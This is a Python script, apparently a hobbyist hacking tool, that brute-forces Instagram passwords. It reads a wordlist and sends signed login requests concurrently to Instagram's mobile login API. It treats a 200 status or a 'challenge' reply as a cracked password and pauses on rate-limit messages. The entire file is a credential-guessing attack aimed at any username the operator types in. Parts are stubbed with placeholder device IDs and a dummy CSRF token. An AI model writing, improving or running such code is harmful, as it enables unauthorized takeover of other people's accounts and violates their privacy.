import asyncio
import hashlib
import hmac
import json
import aiohttp


# Baner de presentación


def banner():
    """Muestra un mensaje de bienvenida o banner en la consola."""
    print("""
'  .######..####.........#####..######.##..##.######..####..######.
'  ...##...##............##..##.##.....###.##...##...##.....##.....
'  ...##...##.###.######.##..##.####...##.###...##....####..####...
'  ...##...##..##........##..##.##.....##..##...##.......##.##.....
'  .######..####.........#####..######.##..##.######..####..######.
'  ................................................................
.  .....................By_RacoonRoach.............................
   """)


# Configuración constante
API_URL = "https://i.instagram.com/api/v1/accounts/login/"
USER_AGENT = "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
IG_SIG = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"


# Función para generar identificadores de dispositivo
def generate_device_identifiers():
    return {
        "phone": "random_phone_id",
        "guid": "random_guid",
        "device": "random_device_id"
    }


async def async_bruteforce(session, username, password, identifiers, index, semaphore):
    """Realiza una prueba de contraseña de forma asíncrona."""
    async with semaphore:  # Limitar la concurrencia
        print(f"🔑 Probando contraseña ({index + 1}): {password}")

        data = {
            "phone_id": identifiers["phone"],
            "_csrftoken": "token_placeholder",
            "username": username,
            "guid": identifiers["guid"],
            "device_id": identifiers["device"],
            "password": password,
            "login_attempt_count": "0"
        }

        signed_data = hmac.new(
            IG_SIG.encode(),
            json.dumps(data).encode(),  # Usar JSON para una representación más clara
            hashlib.sha256
        ).hexdigest()

        headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            async with session.post(
                    API_URL,
                    data={"ig_sig_key_version": 4, "signed_body": f"{signed_data}.{json.dumps(data)}"},
                    headers=headers,
                    timeout=10
            ) as response:

                response_text = await response.text()
                if "challenge" in response_text:
                    print(f"[*] Contraseña encontrada (requiere verificación): {password}")
                    return password
                elif response.status == 200:
                    print(f"[*] Contraseña encontrada: {password}")
                    return password
                elif "Please wait" in response_text:
                    print("⏳ Demasiados intentos. Reintentando...")
                    await asyncio.sleep(5)
        except aiohttp.ClientError as e:
            print(f"❌ Error de conexión al intentar la contraseña: {e}")
        except asyncio.TimeoutError:
            print("❌ Timeout al intentar la contraseña.")
    return None


async def async_bruteforce_main(username, wordlist_path, identifiers, semaphore):
    """Lógica principal de prueba de contraseña de forma asincrónica."""
    with open(wordlist_path, "r") as file:
        passwords = [line.strip() for line in file.readlines()]

    async with aiohttp.ClientSession() as session:
        tasks = []
        for index, password in enumerate(passwords):
            task = asyncio.create_task(async_bruteforce(session, username, password, identifiers, index, semaphore))
            tasks.append(task)

        results = await asyncio.gather(*tasks)
    return next((result for result in results if result is not None), None)


def check_account(username: str) -> bool:
    # Aquí se implementa una verificación de solicitud real de cuenta

    if username:
        return True
    else:
        print("❌ Usuario no existe")
        return False


async def async_main():
    """Función principal asincrónica."""
    banner()
    username = input("📝 Ingresa el nombre de usuario : ").strip()

    if not username:
        print("❌ El nombre de usuario no puede estar vacío.")
        return
    if not check_account(username):
        return

    wordlist_path = input(
        "📃 Ingresa el nombre de la lista de contraseñas: ").strip() or "Pass.lst"

    try:
        threads = int(input("🔗 Potencia < 20 (por defecto: 15): ").strip() or 15)
    except ValueError:
        print("❌ El número debe ser un entero.")
        return

    # Limitar la cantidad de tareas concurrentes
    semaphore = asyncio.Semaphore(threads)

    identifiers = generate_device_identifiers()
    password = await async_bruteforce_main(username, wordlist_path, identifiers, semaphore)

    if password:
        print(f"✔️ Contraseña para {username}: {password}")
    else:
        print("❌ Contraseña no encontrada.")


if __name__ == "__main__":
    asyncio.run(async_main())
